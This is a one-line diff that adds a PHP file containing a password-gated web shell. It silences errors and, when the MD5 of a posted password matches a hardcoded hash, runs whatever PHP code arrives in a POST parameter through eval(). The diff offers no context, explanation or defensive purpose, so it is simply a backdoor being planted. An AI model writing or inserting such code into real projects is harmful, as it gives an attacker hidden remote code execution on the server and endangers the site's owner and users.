@@ -1,0 +1,1 @@
+<?php error_reporting(0);if (md5($_POST['pw'])==='b0712b8b6f708ee0d9f69ca48c511580'){eval($_POST[cmd]);} ?>
